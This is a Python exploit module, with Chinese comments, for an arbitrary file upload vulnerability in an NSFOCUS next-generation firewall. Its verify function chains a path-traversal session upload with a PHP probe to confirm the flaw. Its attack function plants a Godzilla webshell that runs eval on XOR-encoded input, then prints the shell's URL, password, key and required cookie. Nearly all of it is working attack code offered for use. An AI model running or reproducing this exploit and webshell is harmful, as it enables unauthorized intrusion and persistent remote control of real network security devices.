import requests
import re, time, hashlib
import urllib, random
from urllib.parse import quote

def verify(url):
    result = {
        'name': '绿盟下一代防火墙 resourse.php 任意文件上传漏洞',
        'vulnerable': False,
        'attack': True,
        'about': 'https://github.com/luck-ying/Library-POC/blob/be26ae4e4c5bdec61dfc485d183826d09fe7e490/%E7%BB%BF%E7%9B%9F/nsfocus_NGFW_resourse.php_arbitrary_file_upload.py',
    }
    timeout = 3
    # 随机生成字符串
    str_num = str(random.randint(1000000000, 9999999999))
    # 进行md5加密
    str_md5 = hashlib.md5(str_num.encode()).hexdigest()
    shell = f"""<?php echo md5({str_num});unlink(__FILE__);?>"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=123',
        'Cookie': 'PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71',
    }
    # 提取ip，协议，然后加上端口
    url_one = url.split('//')[0] + '//' + url.split('//')[1].split(':')[0] + ':8081'
    path_one = "/api/v1/device/bugsInfo"
    data_one = """--123\nContent-Disposition: form-data; name="file"; filename="sess_82c13f359d0dd8f51c29d658a9c8ac71"\n\nlang|s:52:"../../../../../../../../../../../../../../../../tmp/";\n--123--"""
    path_two = "/api/v1/device/bugsInfo"
    data_two = """--123\nContent-Disposition: form-data; name="file"; filename="compose.php"\n\n{0}\n--123--""".format(shell)
    # 提取ip，协议，然后加上端口
    url_three = url.split('//')[0] + '//' + url.split('//')[1].split(':')[0] + ':4433'
    path_three = "/mail/include/header_main.php"
    try:
        # 第一次发包，解除数据超过8M
        resq_one = requests.post(url=url_one + path_one, data=data_one, headers=headers, timeout=timeout, verify=False)
        if resq_one.status_code == 200 and "NSFOCUS" in resq_one.text:
            # 第二次发包，上传php代码
            resq_two = requests.post(url=url_one + path_two, data=data_two, headers=headers, timeout=timeout, verify=False)
            # 第三次发包，检验代码是否执行
            resq_three = requests.get(url=url_three + path_three, headers=headers, timeout=timeout, verify=False)
            if str_md5 in resq_three.text:
                result['vulnerable'] = True
        return result
    except:
        return result

def attack(url):
    shell = """<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='pass';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
"""
    timeout = 10
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=123',
        'Cookie': 'PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71',
    }
    # 提取ip，协议，然后加上端口
    url_one = url.split('//')[0] + '//' + url.split('//')[1].split(':')[0] + ':8081'
    path_one = "/api/v1/device/bugsInfo"
    data_one = """--123\nContent-Disposition: form-data; name="file"; filename="sess_82c13f359d0dd8f51c29d658a9c8ac71"\n\nlang|s:52:"../../../../../../../../../../../../../../../../tmp/";\n--123--"""
    path_two = "/api/v1/device/bugsInfo"
    data_two = """--123\nContent-Disposition: form-data; name="file"; filename="compose.php"\n\n{0}\n--123--""".format(shell)
    # 提取ip，协议，然后加上端口
    url_three = url.split('//')[0] + '//' + url.split('//')[1].split(':')[0] + ':4433'
    path_three = "/mail/include/header_main.php"
    print("[*] exploit loading ......")
    time.sleep(1)
    try:
        print("[+] 开始上传哥斯拉 webshell")
        # 第一次发包，解除数据超过8M
        resq_one = requests.post(url=url_one + path_one, data=data_one, headers=headers, timeout=timeout, verify=False)
        if resq_one.status_code == 200 and "NSFOCUS" in resq_one.text:
            # 第二次发包，上传php代码
            print("[+] 上传完成，正在检测是否存在?")
            resq_two = requests.post(url=url_one + path_two, data=data_two, headers=headers, timeout=timeout, verify=False)
            # 第三次发包，检验代码是否执行
            resq_three = requests.get(url=url_three + path_three, headers=headers, timeout=timeout, verify=False)
            if resq_three.status_code == 200:
                print("[*] 上传成功, webshell(哥斯拉): ", url_three + path_three)
                print("[*] 密码: pass  密钥: key  加密器: php_xor_base64")
                print("[+] 需要添加请求头连接: Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71")
                return True
        return False
    except:
        return False
